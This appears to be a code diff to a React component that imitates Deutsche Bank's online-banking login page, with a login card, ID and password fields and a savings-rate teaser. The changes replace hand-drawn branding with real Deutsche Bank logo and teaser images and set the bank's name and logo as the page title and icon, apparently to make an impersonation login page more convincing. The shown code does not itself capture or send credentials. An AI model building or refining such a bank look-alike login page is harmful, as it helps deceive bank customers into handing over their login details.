@@ -5,6 +5,8 @@ import LoadingOverlay from "@/components/LoadingOverlay";
 import { usePageMeta } from "@/hooks/use-page-meta";
 import { Info, AlertTriangle, Monitor, Lock, Eye, EyeOff, ArrowLeft } from "lucide-react";
 import bgAsset from "@/assets/deutsche-bank-bg.jpg.asset.json";
+import logoAsset from "@/assets/deutsche-bank-logo.svg.asset.json";
+import teaserAsset from "@/assets/deutsche-bank-teaser.jpg.asset.json";
 
 const BLUE = "#0018a8";
 const RED = "#c1002b";
@@ -23,7 +25,7 @@ const DeutscheBank = () => {
   useEffect(() => {
     window.scrollTo(0, 0);
   }, []);
-  usePageMeta("Deutsche Bank – Online-Banking", "/favicon.ico");
+  usePageMeta("Deutsche Bank – Online-Banking", logoAsset.url);
 
   const handleContinue = () => {
     if (dbId.trim().length === 0) return;
@@ -114,20 +116,8 @@ const DeutscheBank = () => {
 
               {/* Login card */}
               <div className="bg-white p-6 lg:p-8 shadow-sm">
-                <div className="flex items-center gap-2 mb-6" style={{ color: "#111" }}>
-                  <span className="text-[18px] font-semibold">Deutsche Bank</span>
-                  <span
-                    className="inline-block"
-                    style={{
-                      width: 16,
-                      height: 16,
-                      border: `2px solid ${BLUE}`,
-                    }}
-                  >
-                    <span className="block w-full h-full" style={{
-                      background: `linear-gradient(to bottom right, transparent 45%, ${BLUE} 45%, ${BLUE} 55%, transparent 55%)`,
-                    }} />
-                  </span>
+                <div className="mb-6">
+                  <img src={logoAsset.url} alt="Deutsche Bank" className="h-7 w-auto" />
                 </div>
 
                 {step === 2 && (
@@ -232,20 +222,12 @@ const DeutscheBank = () => {
             {/* RIGHT COLUMN */}
             <div className="db-right-panel bg-white shadow-sm">
               {/* FestzinsSparen teaser - inset within a white frame */}
-              <a href="#" className="block px-5 pt-8 pb-4">
-                <div
-                  className="w-full px-5 py-5"
-                  style={{ backgroundColor: "#0a1a4a", color: "#e3ff00" }}
-                >
-                  <div className="flex items-start justify-end leading-none">
-                    <span className="text-[62px] font-bold">3,0</span>
-                    <span className="text-[44px] font-bold leading-none ml-1 mt-1.5">%</span>
-                    <span className="text-[10px] font-semibold mt-2 ml-0.5">p. a.*</span>
-                  </div>
-                  <div className="text-[26px] font-bold leading-none mt-1 text-right">
-                    FestzinsSparen
-                  </div>
-                </div>
+              <a href="#" className="block px-5 pt-5 pb-4">
+                <img
+                  src={teaserAsset.url}
+                  alt="3,0 % p.a. FestzinsSparen"
+                  className="w-full h-auto block"
+                />
                 <div className="pt-4">
                   <div className="text-[16px] font-semibold leading-snug" style={{ color: "#111" }}>
                     3,0 % p.a.* Zinsen fest für<br />12 Monate bei Neugeld
